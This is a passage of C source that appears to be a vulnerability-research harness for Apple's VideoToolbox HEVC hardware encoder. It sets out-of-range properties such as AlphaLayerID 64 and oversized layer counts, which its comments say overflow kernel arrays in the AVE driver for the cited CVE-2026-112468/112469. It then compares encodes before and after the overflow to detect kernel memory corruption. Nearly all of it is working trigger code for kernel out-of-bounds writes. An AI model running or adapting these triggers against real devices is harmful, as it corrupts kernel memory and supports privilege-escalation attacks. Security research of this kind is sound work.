            ln[0] = CFNumberCreate(NULL, kCFNumberIntType, &layers[0]);
            ln[1] = CFNumberCreate(NULL, kCFNumberIntType, &layers[1]);
            CFArrayRef la = CFArrayCreate(NULL, (const void **)ln, 2, &kCFTypeArrayCallBacks);
            OSStatus sp1 = VTSessionSetProperty(s,
                kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, la);
            rlog("MVHEVCVideoLayerIDs [0,1]: %d\n", (int)sp1);
            OSStatus sp2 = VTSessionSetProperty(s,
                kVTCompressionPropertyKey_MVHEVCViewIDs, la);
            rlog("MVHEVCViewIDs [0,1]: %d\n", (int)sp2);
            CFRelease(la); CFRelease(ln[0]); CFRelease(ln[1]);

            /* Stereo eye views */
            VTSessionSetProperty(s,
                kVTCompressionPropertyKey_HasLeftStereoEyeView, kCFBooleanTrue);
            VTSessionSetProperty(s,
                kVTCompressionPropertyKey_HasRightStereoEyeView, kCFBooleanTrue);

            /* Enable alpha */
            OSStatus sp3 = VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
            rlog("EncodesAlpha: %d\n", (int)sp3);

            /* Set high AlphaLayerID (past vps_max_layer_id < 63 bound) */
            int aid = unsafe ? 64 : 2;
            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
            OSStatus sp4 = VTSessionSetProperty(s,
                CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
            CFRelease(aidn);
            rlog("RequiredHEVCVideoParameterSetAlphaLayerID=%d: %d\n", aid, (int)sp4);

            /* Set 4 RepFormat entries (past vps_num_rep_formats_minus1 < 2) */
            int bds[] = {8, 10, 12, 8};
            CFNumberRef bdnums[4];
            for (int j = 0; j < 4; j++)
                bdnums[j] = CFNumberCreate(NULL, kCFNumberIntType, &bds[j]);
            CFArrayRef bdarr = CFArrayCreate(NULL, (const void **)bdnums, 4,
                &kCFTypeArrayCallBacks);
            OSStatus sp5 = VTSessionSetProperty(s,
                CFSTR("RequiredHEVCVideoParameterSetRepFormatBitDepths"), bdarr);
            CFRelease(bdarr);
            for (int j = 0; j < 4; j++) CFRelease(bdnums[j]);
            rlog("RepFormatBitDepths [4 entries]: %d\n", (int)sp5);

            /* Set temporal layers (contributes to vps_max_sub_layers_minus1) */
            int ntl = unsafe ? 16 : 4;
            CFNumberRef ntn = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
            OSStatus sp6 = VTSessionSetProperty(s,
                CFSTR("NumberOfTemporalLayers"), ntn);
            CFRelease(ntn);
            rlog("NumberOfTemporalLayers=%d: %d\n", ntl, (int)sp6);

            /* HEVCAuxiliaryLayerIDs (adds to num_add_layer_sets) */
            int auxids[] = {0, 1, 2, 3};
            CFNumberRef auxnums[4];
            for (int j = 0; j < 4; j++)
                auxnums[j] = CFNumberCreate(NULL, kCFNumberIntType, &auxids[j]);
            CFArrayRef auxarr = CFArrayCreate(NULL, (const void **)auxnums, 4,
                &kCFTypeArrayCallBacks);
            OSStatus sp7 = VTSessionSetProperty(s,
                CFSTR("HEVCAuxiliaryLayerIDs"), auxarr);
            CFRelease(auxarr);
            for (int j = 0; j < 4; j++) CFRelease(auxnums[j]);
            rlog("HEVCAuxiliaryLayerIDs [4 entries]: %d\n", (int)sp7);

            /* Prepare — triggers sAddClient which populates sHEVC_VPS */
            st = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("PrepareToEncodeFrames: %d\n", (int)st);

            if (st == noErr) {
                g_encode_done = 0;
                g_cb_status = -999;
                g_last_pset_count = 0;
                g_last_pset_total_bytes = 0;

                encode_one(s, 0, w, h);
                for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
                rlog("Encode: status=%d, psets=%zu, bytes=%zu\n",
                    (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);

                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
            }

            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

        if (phase == 0 || phase == 5) {
            rlog("\n--- Phase 5: HEVC-with-alpha codec type ---\n");
            rlog("Testing AlphaLayerID values on muxa codec (generates multi-layer VPS)\n");
            rlog("27.2 bound: vps_max_layer_id < 63\n\n");

            /* Test range of AlphaLayerID values on the actual alpha codec */
            int test_aids[] = {1, 2, 32, 62, 63, 64, 127, 255};
            int n_aids = unsafe ? 8 : 5; /* unsafe includes 64, 127, 255 */

            for (int ta = 0; ta < n_aids; ta++) {
                int aid = test_aids[ta];
                rlog("  AlphaLayerID=%d on muxa: ", aid);

                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);

                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                    (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
                    encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (st != noErr || !s) {
                    rlog("session fail (%d)\n", (int)st);
                    continue;
                }

                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

                float aq = 0.75f;
                CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
                VTSessionSetProperty(s, CFSTR("TargetQualityForAlpha"), aqn);
                CFRelease(aqn);

                VTSessionSetProperty(s,
                    CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));

                CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
                OSStatus sp = VTSessionSetProperty(s,
                    CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
                CFRelease(aidn);
                rlog("set=%d, ", (int)sp);

                st = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("prepare=%d, ", (int)st);

                if (st == noErr) {
                    g_encode_done = 0;
                    g_cb_status = -999;
                    g_last_pset_count = 0;
                    g_last_pset_total_bytes = 0;

                    CVPixelBufferRef pb = NULL;
                    CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                    CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
                        CFDictionaryCreate(NULL, NULL, NULL, 0,
                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
                    CVReturn cvr = CVPixelBufferCreate(NULL, w, h,
                        kCVPixelFormatType_32BGRA, pbdict, &pb);
                    CFRelease(pbdict);

                    if (cvr == 0 && pb) {
                        CVPixelBufferLockBaseAddress(pb, 0);
                        void *base = CVPixelBufferGetBaseAddress(pb);
                        if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
                        CVPixelBufferUnlockBaseAddress(pb, 0);

                        CMTime pts = CMTimeMake(0, 30);
                        CMTime dur = CMTimeMake(1, 30);
                        st = VTCompressionSessionEncodeFrame(s, pb, pts, dur,
                            NULL, NULL, NULL);
                        for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
                        rlog("encode=%d, psets=%zu, bytes=%zu\n",
                            (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);

                        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                        CVPixelBufferRelease(pb);
                    } else {
                        rlog("pb fail\n");
                    }
                } else {
                    rlog("\n");
                }

                VTCompressionSessionInvalidate(s);
                CFRelease(s);
            }
        }

vps_props_done:
        rlog("\n=== VPS_PROPS complete ===\n");
        rlog("Properties accepted by VT but NOT validated in kernel (27.1) will\n");
        rlog("overflow sHEVC_VPS extension arrays during sAddClient.\n");
        rlog("Compare which properties report set=0 (accepted) above.\n");

    } else if (strcmp(mode, "vps_corrupt_detect") == 0) {
        /*
         * vps_corrupt_detect — Detect if OOB AlphaLayerID corrupts kernel state
         *
         * Test: encode with OOB value, then encode with safe value on new session.
         * If second encode is affected, proves kernel memory was corrupted.
         */
        int oob_val = (argc > 2) ? atoi(argv[2]) : 64;
        int rounds = (argc > 3) ? atoi(argv[3]) : 3;
        int w = 192, h = 192;

        rlog("=== VPS_CORRUPT_DETECT: kernel OOB write detection ===\n");
        rlog("OOB AlphaLayerID=%d, rounds=%d\n\n", oob_val, rounds);

        /* Phase A: Control — safe encode WITHOUT prior OOB */
        rlog("--- Phase A: Control (no prior OOB) ---\n");
        for (int r = 0; r < rounds; r++) {
            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
                encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) { rlog("  ctrl[%d]: create fail %d\n", r, (int)st); continue; }

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            float aq = 0.75f;
            CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
            VTSessionSetProperty(s, CFSTR("TargetQualityForAlpha"), aqn);
            CFRelease(aqn);
            VTSessionSetProperty(s, CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));
            int safe_aid = 1;
            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &safe_aid);
            VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
            CFRelease(aidn);

            st = VTCompressionSessionPrepareToEncodeFrames(s);
            if (st != noErr) { rlog("  ctrl[%d]: prep fail %d\n", r, (int)st); VTCompressionSessionInvalidate(s); CFRelease(s); continue; }

            g_encode_done = 0; g_cb_status = -999;
            g_last_pset_count = 0; g_last_pset_total_bytes = 0;

            CVPixelBufferRef pb = NULL;
            CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
                CFDictionaryCreate(NULL, NULL, NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
            CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, pbdict, &pb);
            CFRelease(pbdict);
            if (pb) {
                CVPixelBufferLockBaseAddress(pb, 0);
                void *base = CVPixelBufferGetBaseAddress(pb);
                if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
                CVPixelBufferUnlockBaseAddress(pb, 0);
                CMTime pts = CMTimeMake(r, 30);
                CMTime dur = CMTimeMake(1, 30);
                VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
                for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
                rlog("  ctrl[%d]: enc=%d psets=%zu bytes=%zu\n",
                    r, (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                CVPixelBufferRelease(pb);
            }
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

        /* Phase B: OOB trigger + immediate safe encode */
        rlog("\n--- Phase B: OOB trigger then safe encode ---\n");
        for (int r = 0; r < rounds; r++) {
            /* B1: OOB session */
            rlog("  round[%d] OOB(aid=%d): ", r, oob_val);
            {
                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                    (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
                    encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (st != noErr || !s) { rlog("create fail %d\n", (int)st); continue; }

                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                float aq = 0.75f;
                CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
                VTSessionSetProperty(s, CFSTR("TargetQualityForAlpha"), aqn);
                CFRelease(aqn);
                VTSessionSetProperty(s, CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));
                CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &oob_val);
                VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
                CFRelease(aidn);

                st = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("prep=%d ", (int)st);

                if (st == noErr) {
                    g_encode_done = 0; g_cb_status = -999;
                    g_last_pset_count = 0; g_last_pset_total_bytes = 0;
                    CVPixelBufferRef pb = NULL;
                    CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                    CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
                        CFDictionaryCreate(NULL, NULL, NULL, 0,
                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
                    CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, pbdict, &pb);
                    CFRelease(pbdict);
                    if (pb) {
                        CVPixelBufferLockBaseAddress(pb, 0);
                        void *base = CVPixelBufferGetBaseAddress(pb);
                        if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
                        CVPixelBufferUnlockBaseAddress(pb, 0);
                        CMTime pts = CMTimeMake(0, 30);
                        CMTime dur = CMTimeMake(1, 30);
                        VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
                        for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
                        rlog("enc=%d psets=%zu\n", (int)g_cb_status, g_last_pset_count);
                        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                        CVPixelBufferRelease(pb);
                    }
                } else {
                    rlog("\n");
                }
                VTCompressionSessionInvalidate(s);
                CFRelease(s);
            }

            /* B2: Immediate safe session after OOB */
            rlog("  round[%d] SAFE(aid=1): ", r);
            {
                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                    (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
                    encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (st != noErr || !s) { rlog("create fail %d\n", (int)st); continue; }

                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                float aq = 0.75f;
                CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
                VTSessionSetProperty(s, CFSTR("TargetQualityForAlpha"), aqn);
                CFRelease(aqn);
                VTSessionSetProperty(s, CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));
                int safe_aid = 1;
                CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &safe_aid);
                VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
                CFRelease(aidn);

                st = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("prep=%d ", (int)st);

                if (st == noErr) {
                    g_encode_done = 0; g_cb_status = -999;
                    g_last_pset_count = 0; g_last_pset_total_bytes = 0;
                    CVPixelBufferRef pb = NULL;
                    CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                    CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
                        CFDictionaryCreate(NULL, NULL, NULL, 0,
                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
                    CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, pbdict, &pb);
                    CFRelease(pbdict);
                    if (pb) {
                        CVPixelBufferLockBaseAddress(pb, 0);
                        void *base = CVPixelBufferGetBaseAddress(pb);
                        if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
                        CVPixelBufferUnlockBaseAddress(pb, 0);
                        CMTime pts = CMTimeMake(0, 30);
                        CMTime dur = CMTimeMake(1, 30);
                        VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
                        for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
                        rlog("enc=%d psets=%zu bytes=%zu\n",
                            (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
                        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                        CVPixelBufferRelease(pb);
                    }
                } else {
                    rlog("\n");
                }
                VTCompressionSessionInvalidate(s);
                CFRelease(s);
            }
        }

        /* Phase C: Multiple OOB encodes then safe — cumulative corruption */
        rlog("\n--- Phase C: 5x OOB then safe ---\n");
        for (int oob_round = 0; oob_round < 5; oob_round++) {
            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
                encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) { rlog("  oob[%d]: create fail %d\n", oob_round, (int)st); continue; }

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            float aq = 0.75f;
            CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
            VTSessionSetProperty(s, CFSTR("TargetQualityForAlpha"), aqn);
            CFRelease(aqn);
            VTSessionSetProperty(s, CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));
            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &oob_val);
            VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
            CFRelease(aidn);

            st = VTCompressionSessionPrepareToEncodeFrames(s);
            if (st == noErr) {
                g_encode_done = 0; g_cb_status = -999;
                g_last_pset_count = 0;
                CVPixelBufferRef pb = NULL;
                CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
                    CFDictionaryCreate(NULL, NULL, NULL, 0,
                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
                CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, pbdict, &pb);
                CFRelease(pbdict);
                if (pb) {
                    CVPixelBufferLockBaseAddress(pb, 0);
                    void *base = CVPixelBufferGetBaseAddress(pb);
                    if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
                    CVPixelBufferUnlockBaseAddress(pb, 0);
                    CMTime pts = CMTimeMake(oob_round, 30);
                    CMTime dur = CMTimeMake(1, 30);
                    VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
                    for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
                    rlog("  oob[%d]: enc=%d psets=%zu\n", oob_round, (int)g_cb_status, g_last_pset_count);
                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                    CVPixelBufferRelease(pb);
                }
            } else {
                rlog("  oob[%d]: prep fail %d\n", oob_round, (int)st);
            }
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }
        /* Now safe encode */
        {
            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
                encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) { rlog("  safe after 5x: create fail %d\n", (int)st); goto vps_cd_done; }

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            float aq = 0.75f;
            CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
            VTSessionSetProperty(s, CFSTR("TargetQualityForAlpha"), aqn);
            CFRelease(aqn);
            VTSessionSetProperty(s, CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));
            int safe_aid = 1;
            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &safe_aid);
            VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
            CFRelease(aidn);

            st = VTCompressionSessionPrepareToEncodeFrames(s);
            if (st == noErr) {
                g_encode_done = 0; g_cb_status = -999;
                g_last_pset_count = 0; g_last_pset_total_bytes = 0;
                CVPixelBufferRef pb = NULL;
                CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
                    CFDictionaryCreate(NULL, NULL, NULL, 0,
                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
                CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, pbdict, &pb);
                CFRelease(pbdict);
                if (pb) {
                    CVPixelBufferLockBaseAddress(pb, 0);
                    void *base = CVPixelBufferGetBaseAddress(pb);
                    if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
                    CVPixelBufferUnlockBaseAddress(pb, 0);
                    CMTime pts = CMTimeMake(0, 30);
                    CMTime dur = CMTimeMake(1, 30);
                    VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
                    for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
                    rlog("  safe after 5x: enc=%d psets=%zu bytes=%zu\n",
                        (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                    CVPixelBufferRelease(pb);
                }
            } else {
                rlog("  safe after 5x: prep fail %d\n", (int)st);
            }
            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

vps_cd_done:
        rlog("\n=== VPS_CORRUPT_DETECT complete ===\n");
        rlog("Compare Phase A (control) vs Phase B (after OOB) vs Phase C (after 5x OOB).\n");
        rlog("If safe encodes after OOB differ from control → kernel state corrupted.\n");

    } else if (strcmp(mode, "mctf_oob") == 0) {
        /*
         * mctf_oob — CVE-2026-112468/112469: MCTF and LRME OOB via encode properties
         *
         * 27.2 adds AVE_Client_CheckMCTFInfo and AVE_Client_CheckLRMEInfo with bounds:
         *   iMCTFStrengthLevelNum <= 2
         *   iNumberOfTemporalLayers <= 7
         * These checks are MISSING in 27.1 — uPropCfg flows through sSessionSettings.
         */
        int phase = (argc > 2) ? atoi(argv[2]) : 0;
        int max_val = (argc > 3) ? atoi(argv[3]) : 8;
        if (max_val < 1) max_val = 1;
        if (max_val > 256) max_val = 256;

        rlog("=== MCTF_OOB: CVE-2026-112468/112469 property-path OOB test ===\n");
        rlog("Target: iMCTFStrengthLevelNum (bounds <= 2 in 27.2, UNCHECKED in 27.1)\n");
        rlog("Target: iNumberOfTemporalLayers (bounds <= 7 in 27.2, UNCHECKED in 27.1)\n");
        rlog("Phase: %d (0=all), max_val: %d\n\n", phase, max_val);

        int w = 1920, h = 1080;

        if (phase == 0 || phase == 1) {
            rlog("--- Phase 1: Full property enumeration with MCTF/temporal focus ---\n\n");

            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
                kCFBooleanTrue);
            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) {
                rlog("FAIL: create HEVC encoder: %d\n", (int)st);
                goto done;
            }
            rlog("HEVC encoder session created OK\n\n");

            CFDictionaryRef props = NULL;
            st = VTSessionCopySupportedPropertyDictionary(s, &props);
            if (st != noErr || !props) {
                rlog("FAIL: CopySupportedPropertyDictionary: %d\n", (int)st);
                VTCompressionSessionInvalidate(s); CFRelease(s);
                goto done;
            }

            CFIndex count = CFDictionaryGetCount(props);
            rlog("Total supported properties: %ld\n\n", (long)count);

            const void **keys = malloc(sizeof(void*) * count);
            const void **vals = malloc(sizeof(void*) * count);
            CFDictionaryGetKeysAndValues(props, keys, vals);

            rlog("--- Properties containing MCTF, Temporal, Strength, Level, Layer ---\n");
            int found_mctf = 0;
            for (CFIndex i = 0; i < count; i++) {
                char keystr[512] = {0};
                CFStringGetCString((CFStringRef)keys[i], keystr, sizeof(keystr),
                    kCFStringEncodingUTF8);
                int match = 0;
                const char *patterns[] = {
                    "MCTF", "mctf", "Temporal", "temporal", "Strength", "strength",
                    "Level", "level", "Layer", "layer", "LRME", "lrme",
                    "MotionCompensated", "NoiseReduction", "Filter",
                    "BaseLayer", "NumberOf", NULL
                };
                for (int p = 0; patterns[p]; p++) {
                    if (strstr(keystr, patterns[p])) { match = 1; break; }
                }
                if (!match) continue;
                found_mctf++;
                rlog("  MATCH: %s\n", keystr);
                if (CFGetTypeID((CFTypeRef)vals[i]) == CFDictionaryGetTypeID()) {
                    CFDictionaryRef info = (CFDictionaryRef)vals[i];
                    CFStringRef ptype = CFDictionaryGetValue(info, CFSTR("PropertyType"));
                    if (ptype) {
                        char tstr[64] = {0};
                        CFStringGetCString(ptype, tstr, sizeof(tstr), kCFStringEncodingUTF8);
                        rlog("         Type: %s", tstr);
                    }
                    CFStringRef rw = CFDictionaryGetValue(info, CFSTR("ReadWriteStatus"));
                    if (rw) {
                        char rwstr[32] = {0};
                        CFStringGetCString(rw, rwstr, sizeof(rwstr), kCFStringEncodingUTF8);
                        rlog("  RW: %s", rwstr);
                    }
                    CFNumberRef minv = CFDictionaryGetValue(info, CFSTR("SupportedValueMinimumKey"));
                    CFNumberRef maxv = CFDictionaryGetValue(info, CFSTR("SupportedValueMaximumKey"));
                    if (minv) { double mv = 0; CFNumberGetValue(minv, kCFNumberDoubleType, &mv); rlog("  Min: %.0f", mv); }
                    if (maxv) { double mv = 0; CFNumberGetValue(maxv, kCFNumberDoubleType, &mv); rlog("  Max: %.0f", mv); }
                    rlog("\n");
                }
            }
            if (!found_mctf) rlog("  (no MCTF/temporal matches in supported properties)\n");

            rlog("\n--- ALL %ld properties (compact listing) ---\n", (long)count);
            for (CFIndex i = 0; i < count; i++) {
                char keystr[512] = {0};
                CFStringGetCString((CFStringRef)keys[i], keystr, sizeof(keystr),
                    kCFStringEncodingUTF8);
                rlog("  [%ld] %s\n", (long)i, keystr);
            }

            free(keys); free(vals);
            CFRelease(props);

            rlog("\n--- Testing undocumented MCTF/LRME property keys ---\n");
            const char *mctf_keys[] = {
                "EnableMCTF", "MCTFStrengthLevelNum", "MCTFStrengthLevel",
                "MCTFEnableGating", "MCTFGatingType", "MCTFPreFiltAdjType",
                "MCTFEnableFeedback", "MCTFLatencyMode", "MCTFEdgeCount",
                "MCTFEdgeThresh", "MCTFMaxNextRefNum", "iMCTFStrengthLevelNum",
                "MotionCompensatedTemporalFilter", "TemporalFilter",
                "TemporalNoiseReduction", "LRMERSPassNum", "EnableLRME",
                "LongRangeMotionEstimation", "NumberOfTemporalLayers",
                "BaseLayerFrameRateFraction", "BaseLayerBitRateFraction",
                "NumTemporalLayers", "TemporalLayerCount", "MaxTemporalLayers",
                "HEVCTemporalSubLayerCount", NULL
            };

            for (int k = 0; mctf_keys[k]; k++) {
                CFStringRef pk = CFStringCreateWithCString(NULL, mctf_keys[k],
                    kCFStringEncodingUTF8);
                CFTypeRef curval = NULL;
                OSStatus gs = VTSessionCopyProperty(s, pk, NULL, &curval);
                rlog("  %-40s get=%d", mctf_keys[k], (int)gs);
                if (gs == noErr && curval) {
                    if (CFGetTypeID(curval) == CFNumberGetTypeID()) {
                        int iv = 0; CFNumberGetValue(curval, kCFNumberIntType, &iv);
                        rlog(" val=%d", iv);
                    } else if (CFGetTypeID(curval) == CFBooleanGetTypeID()) {
                        rlog(" val=%s", CFBooleanGetValue(curval) ? "true" : "false");
                    }
                    CFRelease(curval);
                }
                int test_vals[] = {0, 1, 3, 8, 100};
                for (int t = 0; t < 5; t++) {
                    CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &test_vals[t]);
                    OSStatus ss = VTSessionSetProperty(s, pk, nv);
                    if (ss == noErr) rlog(" SET(%d)=OK", test_vals[t]);
                    CFRelease(nv);
                }
                rlog("\n");
                CFRelease(pk);
            }

